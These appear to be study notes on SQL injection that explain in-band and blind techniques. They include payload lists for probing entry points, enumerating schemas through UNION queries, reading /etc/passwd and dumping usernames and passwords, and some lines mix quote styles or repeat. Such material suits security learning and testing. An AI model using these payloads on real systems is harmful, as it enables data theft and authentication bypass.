SQL (Structured Query Language) Injection, mostly referred to as SQLi, is an attack on a web application database server that causes malicious queries to be executed. When a web application communicates with a database using input from a user that hasn't been properly validated, there runs the potential of an attacker being able to steal, delete or alter private and customer data and also attack the web applications authentication methods to private or customer areas. This is why as well as SQLi being one of the oldest web application vulnerabilities, it also can be the most damaging.

In this room, you'll learn what databases are, what SQL is with some basic SQL commands, how to detect SQL vulnerabilities, how to exploit SQLi vulnerabilities and as a developer how you can protect yourself against SQL Injection.

## What is SQL Injection?
The point wherein a web application using SQL can turn into SQL Injection is when user-provided data gets included in the SQL query.

## In-Band SQL Injection
In-Band SQL Injection is the easiest type to detect and exploit; In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.

- Error-Based SQL Injection:
This type of SQL Injection is the most useful for easily obtaining information about the database structure as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database.

- Union-Based SQL Injection:
This type of Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.
## Entry point detection
      [Nothing]
     '
     "
     `
     ')
     ")
     `)
     '))
     "))
     `))
## Extract database names, table names and column names
     #Database names
     -1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

     #Tables of a database
     -1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

     #Column names
     -1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]

## Blind SQLi

Unlike In-Band SQL injection, where we can see the results of our attack directly on the screen, blind SQLi is when we get little to no feedback to confirm whether our injected queries were, in fact, successful or not, this is because the error messages have been disabled, but the injection still works regardless. It might surprise you that all we need is that little bit of feedback to successful enumerate a whole database.

- Boolean Based: Boolean based SQL Injection refers to the response we receive back from our injection attempts which could be a true/false, yes/no, on/off, 1/0 or any response which can only ever have two outcomes. That outcome confirms to us that our SQL Injection payload was either successful or not. On the first inspection, you may feel like this limited response can't provide much information. Still, in fact, with just these two responses, it's possible to enumerate a whole database structure and contents.
##
      ' OR '1'='1
      ' OR '1'='1' --
      ' OR '1'='1' /*
      ') OR ('1'='1
      ') OR ('1'='1' --
      ') OR ('1'='1' /*
      ")) OR (("1"="1
      ")) OR (("1"="1' --
      ")) OR (("1"="1' /*
      ')) OR (('1'='1
      ')) OR (('1'='1' --
      ')) OR (('1'='1' /*
      ' OR 1=1 --
      ' OR 1=1 /*
      ') OR 1=1 --
      ') OR 1=1 /*
      ")) OR (("1"="1' --
      ")) OR (("1"="1' /*
      ')) OR (('1'='1' --
      ')) OR (('1'='1' /*
      ' OR '1'='1' LIMIT 1 --
      ') OR ('1'='1' LIMIT 1 --
      ")) OR (("1"="1' LIMIT 1 --
      ')) OR (('1'='1' LIMIT 1 --
      ' OR '1'='1' UNION SELECT NULL --
      ') OR ('1'='1' UNION SELECT NULL --
      ")) OR (("1"="1' UNION SELECT NULL --
      ')) OR (('1'='1' UNION SELECT NULL --
      ' OR '1'='1' UNION SELECT NULL, NULL --
      ') OR ('1'='1' UNION SELECT NULL, NULL --
      ")) OR (("1"="1' UNION SELECT NULL, NULL --
      ')) OR (('1'='1' UNION SELECT NULL, NULL --
      ' OR '1'='1' ORDER BY 1 --
      ' OR '1'='1' ORDER BY 2 --
      ' OR '1'='1' ORDER BY 3 --
      ' OR '1'='1' ORDER BY 4 --
      ' OR '1'='1' UNION SELECT NULL --
      ' OR '1'='1' UNION SELECT 'a' --
      ' OR '1'='1' UNION SELECT 'a', 'b' --
      ' OR '1'='1' UNION SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES --
      ' OR '1'='1' UNION SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS --
      ' OR '1'='1' UNION SELECT @@VERSION --
      ' OR '1'='1' UNION SELECT USER() --
      ' OR '1'='1' UNION SELECT DATABASE() --
      ' OR '1'='1' UNION SELECT @@hostname --
      ' OR '1'='1' UNION SELECT LOAD_FILE('/etc/passwd') --
      ' OR '1'='1' UNION SELECT CONCAT('Username: ', username, ' Password: ', password) FROM users --
      ' OR '1'='1' UNION SELECT NULL, table_name FROM information_schema.tables --
      ' OR '1'='1' UNION SELECT NULL, column_name FROM information_schema.columns --
      ' OR '1'='1' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema = 'database_name' --
      ' OR '1'='1' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name = 'table_name' --
      ' OR '1'='1' UNION SELECT NULL, concat(username, ':', password) FROM users --

- Time-Based: A time-based blind SQL Injection is very similar to the above Boolean based, in that the same requests are sent, but there is no visual indicator of your queries being wrong or right this time. Instead, your indicator of a correct query is based on the time the query takes to complete. This time delay is introduced by using built-in methods such as SLEEP(x) alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement. 






